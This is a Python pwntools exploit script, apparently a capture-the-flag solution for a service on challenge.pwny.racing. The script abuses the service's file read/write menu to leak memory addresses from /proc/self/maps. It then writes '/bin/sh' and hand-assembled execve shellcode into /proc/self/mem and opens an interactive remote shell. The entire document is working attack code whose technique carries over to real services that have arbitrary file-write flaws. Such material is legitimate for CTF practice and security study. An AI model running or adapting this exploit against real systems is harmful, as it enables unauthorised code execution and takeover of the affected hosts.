#!/usr/bin/env python2
from pwn import *

HOST = 'challenge.pwny.racing'
PORT = 40014

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]


def readfile(file, size=1024, seek=0):

	io.recvuntil('> ')
	io.sendline('1')

	io.recvuntil(': ')
	io.sendline(file)

	io.recvuntil(': ')
	io.sendline(str(size))

	io.recvuntil(': ')
	io.sendline(str(seek))

	io.recvuntil(': ')
	data = io.recvuntil('\n\n\x1b')[:-3]
	return data


def writefile(file, data, seek=0):

	io.recvuntil('> ')
	io.sendline('2')

	io.recvuntil(': ')
	io.sendline(file)

	io.recvuntil(': ')
	io.sendline(str(len(data)))

	io.recvuntil(': ')
	io.sendline(str(seek))

	io.recvuntil(': ')
	io.send(data)


io = remote(HOST, PORT)
print io.recvuntil('5!\n')

# step 1: read leaks from the memory map
lines = readfile('/proc/self/maps', 4096).split('\n')

base = int(lines[0][:12], 16)
data = int(lines[2][:12], 16)

log.info('base:  0x%012x' % base)
log.info('data:  0x%012x' % data)

# step 2: put "/bin/sh" somewhere to avoid finding it in memory
writefile('/proc/self/mem', "/bin/sh", data+0x100)

# step 3: overwrite the code at the location the binary returns to
pay  = '\x48\xc7\xc0\x3b\x00\x00\x00'  # mov rax, SYS_execve
pay += '\x48\xbf'+p64(data+0x100)      # mov rdi, "/bin/sh"
pay += '\x48\x31\xf6'                  # xor rsi, rsi
pay += '\x48\x31\xd2'                  # xor rdx, rdx
pay += '\x0f\x05'                      # syscall
pay += '\x48\xc7\xc0\x3c\x00\x00\x00'  # mov rax, SYS_exit
pay += '\x0f\x05'                      # syscall

writefile('/proc/self/mem', pay, base+0xef9)

# step 4: collect a shell
io.sendline('id')
log.success('shell? %s' % io.recvline().strip())
io.interactive()
